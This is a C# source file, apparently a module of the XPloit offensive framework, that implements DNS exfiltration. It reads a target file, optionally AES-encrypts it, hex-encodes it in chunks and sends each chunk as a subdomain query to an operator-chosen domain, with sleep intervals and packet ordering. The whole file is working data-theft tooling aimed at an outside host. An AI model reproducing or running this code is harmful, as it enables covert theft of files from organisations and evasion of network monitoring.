﻿using System;
using System.IO;
using System.Net;
using System.Threading;
using XPloit.Core;
using XPloit.Core.Attributes;
using XPloit.Core.Dns;
using XPloit.Core.Enums;
using XPloit.Helpers;
using XPloit.Helpers.Attributes;

namespace Auxiliary.Local.Exfiltration
{
    [ModuleInfo(Author = "Fernando Díaz Toledano", Description = "DNS-Exfiltration send\n" +
                    "<FileId><PacketNumber><Data>.domain\n" +
                    "   FileId -> Length in Target\n" +
                    "   PacketNumber -> 4 bytes, disable in 'SendPacketOrder'")]
    public class DnsExfiltrate : Module, AESHelper.IAESConfig
    {
        #region Configure
        public override Reference[] References
        {
            get
            {
                return new Reference[]
                {
                    new Reference(EReferenceType.URL, "https://es.wikipedia.org/wiki/Domain_Name_System") ,
                };
            }
        }
        public override Target[] Targets
        {
            get
            {
                return new Target[]
                {
                    new Target("Id Incremental (1byte)"  ,new Variable("Size", 1)),
                    new Target("Id Incremental (2bytes)" ,new Variable("Size", 2)),
                    new Target("Id Incremental (4bytes)" ,new Variable("Size", 4)),
                    new Target("Id Incremental (8bytes)" ,new Variable("Size", 8)),

                    new Target("Id by Timestamp (8bytes)",new Variable("Size",-1)),
                };
            }
        }
        #endregion

        #region Properties
        [ConfigurableProperty(Description = "File for exfiltrate")]
        [RequireExists]
        public FileInfo File { get; set; }
        [ConfigurableProperty(Description = "Domain name for exfiltration")]
        public string DomainName { get; set; }
        [ConfigurableProperty(Description = "Sleep between calls (ms)")]
        public int Sleep { get; set; }
        [ConfigurableProperty(Description = "Send packet order")]
        public bool SendPacketOrder { get; set; }

        #region Optional
        [ConfigurableProperty(Optional = true, Description = "Address of dns server (NULL for use default)")]
        public IPAddress DnsServer { get; set; }
        [ConfigurableProperty(Description = "IV for AES encryption")]
        public string AesIV { get; set; }
        [ConfigurableProperty(Description = "Password for AES encryption")]
        public string AesPassword { get; set; }
        [ConfigurableProperty(Description = "Iterations for AES encryption")]
        public int AesIterations { get; set; }
        [ConfigurableProperty(Description = "KeyLength for AES encryption")]
        public AESHelper.EKeyLength AesKeyLength { get; set; }
        [ConfigurableProperty(Description = "RGBSalt for AES encryption")]
        public string AesRGBSalt { get; set; }
        #endregion
        #endregion

        public DnsExfiltrate()
        {
            SendPacketOrder = false;
            DnsServer = null;
            AesIterations = 1000;
            AesKeyLength = AESHelper.EKeyLength.Length256;
            AesRGBSalt = null;
        }

        public override bool Run()
        {
            if (!File.Exists) return false;

            DnsClient dns = DnsServer == null ? DnsClient.Default : new DnsClient(DnsServer, 10000);
            bool ipv6 = dns.Servers[0].AddressFamily == System.Net.Sockets.AddressFamily.InterNetworkV6;

            // Get counter
            byte[] g;
            switch (Convert.ToInt32(Target["Size"]))
            {
                case 8: { g = BitConverterHelper.GetBytesInt64(CounterHelper.GetNextInt64()); break; }
                case 4: { g = BitConverterHelper.GetBytesUInt32(CounterHelper.GetNextUInt32()); break; }
                case 2: { g = BitConverterHelper.GetBytesUInt16(CounterHelper.GetNextUInt16()); break; }
                case 1: { g = new byte[] { CounterHelper.GetNextByte() }; break; }
                default: { g = BitConverterHelper.GetBytesInt64(DateTime.UtcNow.ToBinary()); break; }
            }

            // Copy file id
            bool sendPacketOrder = SendPacketOrder;
            int headerLength = g.Length;

            if (sendPacketOrder) headerLength += 4;    // packetNum

            byte[] data = new byte[63 / 2]; // hex 2 bytes per byte
            Array.Copy(g, data, g.Length);

            AESHelper aes = AESHelper.Create(this);
            if (aes != null) WriteInfo("Using AES Encryption");
            else WriteError("Send in RawMode (without any Encryption)");

            WriteInfo("Start sending file", HexHelper.Buffer2Hex(g, 0, g.Length), ConsoleColor.Green);

            byte[] crypted = null;

            if (aes != null)
            {
                using (Stream fs = File.OpenRead())
                    crypted = aes.Encrypt(fs, false, null);
            }

            int position = 0;
            using (Stream fs = (crypted == null ? (Stream)File.OpenRead() : (Stream)new MemoryStream(crypted)))
            {
                int total = (int)(fs.Length / (data.Length - headerLength));
                if (fs.Length % (data.Length - headerLength) != 0) total++;
                WriteInfo("Sending " + (total) + " dns querys ...");

                StartProgress(total);

                while (true)
                {
                    // copy counter
                    if (sendPacketOrder)
                    {
                        byte[] p = BitConverterHelper.GetBytesInt32(position);
                        Array.Copy(p, 0, data, headerLength - 4, 4);
                    }
                    position++;

                    // read
                    int lee = fs.Read(data, headerLength, data.Length - headerLength);
                    if (lee <= 0) break;

                    // generateFile
                    string name = HexHelper.Buffer2Hex(data, 0, headerLength + lee) + "." + DomainName;

                    dns.Resolve(name, ipv6 ? RecordType.Aaaa : RecordType.A);
                    if (Sleep > 0) Thread.Sleep(Sleep);

                    WriteProgress(position);
                }

                EndProgress();
            }

            WriteInfo("Done");

            return true;
        }

        public override ECheck Check()
        {
            try
            {
                if (!File.Exists)
                {
                    WriteError("File must exists");
                    return ECheck.Error;
                }

                if (DnsServer == null)
                {
                    WriteInfo("Using dns servers:");
                    foreach (IPAddress ip in DnsClient.Default.Servers)
                    {
                        WriteInfo(" " + ip.ToString());
                    }
                }

                return ECheck.Ok;
            }
            catch { return ECheck.Error; }
        }
    }
}
